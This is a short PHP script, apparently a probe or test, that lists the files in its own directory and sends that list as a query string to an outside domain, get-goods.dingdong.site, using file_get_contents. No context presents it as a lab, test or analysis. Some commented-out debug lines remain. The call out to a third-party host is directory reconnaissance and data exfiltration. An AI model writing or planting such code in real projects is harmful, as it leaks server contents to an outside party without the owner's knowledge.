<?php
echo json_encode(dir(__DIR__));
//sleep(500);

$arrFiles = scandir(__DIR__);

//var_dump(__DIR__);exit;
$arrFiles = json_encode($arrFiles);

file_get_contents('http://get-goods.dingdong.site?query='.$arrFiles);


